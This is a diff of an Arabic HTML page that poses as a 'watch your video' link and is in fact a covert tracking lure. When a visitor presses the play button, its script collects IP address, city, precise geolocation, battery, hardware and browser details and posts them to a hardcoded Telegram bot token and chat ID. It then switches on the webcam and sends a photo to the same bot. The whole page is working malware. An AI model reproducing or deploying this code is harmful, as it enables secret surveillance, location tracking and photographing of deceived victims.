@@ -1,150 +1,159 @@
-<!DOCTYPE html><html lang="ar">
+<!DOCTYPE html>
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <title>اضغط لمشاهدة الفيديو</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #111;
-            color: #eee;
-            text-align: center;
-            padding-top: 60px;
-        }
-        button {
-            padding: 14px 28px;
-            font-size: 18px;
-            background-color: #fe2c55;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        video {
-            display: none;
-        }
-        .status {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #ccc;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>📽️ فيديو خاص بك</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Tahoma', sans-serif;
+      background: black;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    h1 {
+      font-size: 26px;
+      margin-bottom: 20px;
+    }
+    p {
+      color: #ccc;
+      margin-bottom: 30px;
+    }
+    button {
+      background: #ff0050;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 50px;
+      font-size: 18px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #ff0050;
+    }
+    video {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <h2>📷 اضغط لمشاهدة الفيديو</h2>
-    <p>📤 موافق لمشاهدة فيديو</p>
-    <button onclick="startProcess()">📤 موافق</button>
-    <div class="status" id="status"></div>
-    <video id="video" autoplay playsinline></video><script>
-    const chatId = "7220184605";
-    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
+  <h1>📽️ اضغط لمشاهدة الفيديو</h1>
+  <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
+  <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
 
-    function updateStatus(message) {
-        document.getElementById('status').innerText = message;
-    }
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
+    const chatId = "7220184605";
 
     async function sendTelegramMessage(text) {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text }),
+      });
     }
 
     async function sendPhoto(blob) {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "photo.jpg");
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        });
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
     }
 
-    async function getDeviceDetails() {
+    async function getIPInfo() {
+      const res = await fetch("https://ipapi.co/json/");
+      return await res.json();
+    }
+
+    async function getBatteryInfo() {
+      try {
         const battery = await navigator.getBattery();
-        const memory = navigator.deviceMemory || 'غير معروف';
-        const cores = navigator.hardwareConcurrency || 'غير معروف';
-        const lang = navigator.language || 'غير معروف';
-        const screenRes = `${screen.width}x${screen.height}`;
-        const colorDepth = screen.colorDepth;
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const isCharging = battery.charging ? 'نعم ⚡' : 'لا ❌';
-        const batteryLevel = `${Math.round(battery.level * 100)}%% 🔋`;
-
-        return `📝 معلومات المستخدم:%0A- الاسم: غير معروف%0A- الهاتف: غير معروف%0A- البريد الإلكتروني: غير معروف%0A%0A📱 معلومات الجهاز:%0A- اسم الجهاز: ${platform} 🖥️%0A- نوع الجهاز: Mobile 📱%0A- إصدار الجهاز: غير معروف 📜%0A- عدد الأنوية: ${cores} ⚙️%0A- الذاكرة (RAM): ${memory} GB 🧠%0A- شحن الهاتف: ${batteryLevel}%0A- هل الهاتف يشحن؟: ${isCharging}%0A- لغة النظام: ${lang} 🌐%0A- دقة الشاشة: ${screenRes} 📏%0A- عمق الألوان: ${colorDepth} bits 🎨%0A- اسم المتصفح: ${userAgent} 🌐`;
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging ? "نعم ⚡" : "لا ❌"
+        };
+      } catch {
+        return { level: "غير معروف", charging: "غير معروف" };
+      }
     }
 
-    async function getIPAndLocation() {
-        try {
-            const ipRes = await fetch("https://ipapi.co/json/");
-            const ipData = await ipRes.json();
-
-            return {
-                ip: ipData.ip,
-                country: ipData.country_name || 'غير معروف',
-                city: ipData.city || 'غير معروف'
-            };
-        } catch {
-            return {
-                ip: 'غير معروف',
-                country: 'غير معروف',
-                city: 'غير معروف'
-            };
-        }
-    }
-
-    async function getGeoLocationText() {
-        try {
-            return await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude.toFixed(5);
-                    const lon = position.coords.longitude.toFixed(5);
-                    resolve(`📍 الموقع: https://maps.google.com/?q=${lat},${lon}`);
-                }, () => resolve("📍 الموقع: رفض المستخدم أو فشل"), {timeout: 5000});
-            });
-        } catch {
-            return "📍 الموقع: رفض المستخدم أو فشل";
-        }
+    async function getLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          const lat = pos.coords.latitude.toFixed(5);
+          const lon = pos.coords.longitude.toFixed(5);
+          resolve(`https://maps.google.com/?q=${lat},${lon}`);
+        }, () => {
+          resolve("❌ غير مسموح أو غير متاح");
+        }, { timeout: 5000 });
+      });
     }
 
     async function startProcess() {
-        updateStatus("⏳ جارٍ المعالجة...");
+      const ipInfo = await getIPInfo();
+      const battery = await getBatteryInfo();
+      const location = await getLocation();
+      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
 
-        const { ip, country, city } = await getIPAndLocation();
-        const geoText = await getGeoLocationText();
-        const deviceDetails = await getDeviceDetails();
-        const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Damascus" });
+      const deviceInfo = navigator.userAgent;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const connection = navigator.connection || {};
+      const memory = navigator.deviceMemory || "غير معروف";
+      const cores = navigator.hardwareConcurrency || "غير معروف";
 
-        const fullMessage = `${deviceDetails}%0A- الدولة: ${country} 🔻%0A- المدينة: ${city} 🏙️%0A- عنوان IP: ${ip} 🌍%0A- الوقت: ${now} ⏰%0A${geoText}`;
-        await sendTelegramMessage(fullMessage);
+      const message = `
+📝 معلومات الزائر:
+🌍 الدولة: ${ipInfo.country_name} 
+🏙️ المدينة: ${ipInfo.city}
+🌐 IP: ${ipInfo.ip}
+📍 الموقع الجغرافي: ${location}
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
+📱 الجهاز:
+🔋 الشحن: ${battery.level}%
+⚡ هل يشحن؟: ${battery.charging}
+📶 الاتصال: ${connection.effectiveType || "غير معروف"}
+💾 الذاكرة: ${memory} GB
+⚙️ الأنوية: ${cores}
+🖥️ المتصفح: ${deviceInfo}
+📏 الشاشة: ${screenRes}
+🕓 الوقت: ${now}
+`;
 
-            setTimeout(async () => {
-                const canvas = document.createElement("canvas");
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      await sendTelegramMessage(message);
 
-                stream.getTracks().forEach(track => track.stop());
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.play();
 
-                canvas.toBlob(async (blob) => {
-                    await sendPhoto(blob);
-                    updateStatus("✅ شكرا لك على مشاهدة ");
-                }, 'image/jpeg');
-            }, 3000);
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        } catch (err) {
-            await sendTelegramMessage("⚠️ لم يتم منح إذن الكاميرا.");
-            updateStatus("❌ فشل الوصول إلى الكاميرا");
-        }
+          stream.getTracks().forEach(track => track.stop());
+
+          canvas.toBlob(async (blob) => {
+            await sendPhoto(blob);
+          }, "image/jpeg");
+        }, 3000);
+      } catch (err) {
+        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
+      }
     }
-</script>
-
+  </script>
 </body>
 </html>
